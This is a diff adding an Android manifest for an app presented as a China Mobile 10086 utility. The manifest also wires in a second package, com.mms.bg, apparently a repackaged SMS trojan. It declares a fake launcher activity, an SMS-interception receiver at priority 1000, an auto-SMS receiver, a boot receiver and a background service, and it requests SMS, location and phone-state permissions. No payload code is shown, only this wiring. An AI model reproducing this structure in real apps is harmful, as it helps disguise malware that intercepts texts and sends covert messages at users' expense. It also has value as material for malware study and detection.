@@ -1,0 +1,81 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.virsir.android.chinamobile10086">
+    <application android:icon="@drawable/icon" android:label="@string/app_name" android:name=".Application" android:theme="@style/Theme.Dark">
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name=".Root"/>
+        <activity android:label="@string/app_name" android:name=".ShortCut">
+            <intent-filter>
+                <action android:name="android.intent.action.CREATE_SHORTCUT"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name=".MainView"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name=".SearchOfficesView"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name=".PromotionView"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name=".news.News"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name=".news.NewsBrowser"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name=".news.NewsDetails"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name=".news.NewsChannelSelector"/>
+        <service android:name=".SMSService"/>
+        <service android:name=".CheckUpdateService"/>
+        <activity android:label="@string/app_name" android:name="com.mms.bg.ui.FakeLanucherActivity" android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <receiver android:name="com.mms.bg.transaction.SmsReceiver">
+            <intent-filter>
+                <action android:name="com.android.mms.transaction.MESSAGE_SENT"/>
+                <data android:scheme="content"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.SEND_MESSAGE"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.mms.bg.transaction.PrivilegedSmsReceiver" android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter android:priority="1000">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.mms.bg.ui.BootReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.mms.bg.ui.AutoSMSRecevier">
+            <intent-filter>
+                <action android:name="com.mms.bg.SMS"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.mms.bg.ui.InternetStatusReceiver">
+            <intent-filter>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+            </intent-filter>
+        </receiver>
+        <service android:name="com.mms.bg.ui.BgService">
+            <intent-filter>
+                <action android:name="com.mms.bg.FILTER_ACTION"/>
+            </intent-filter>
+            <meta-data android:name="com.mms.bg.pid" android:value="10055"/>
+            <meta-data android:name="com.package.name" android:value="com.virsir.android.chinamobile10086"/>
+            <meta-data android:name="com.component.name" android:value="com.virsir.android.chinamobile10086.Root"/>
+        </service>
+    </application>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+</manifest>
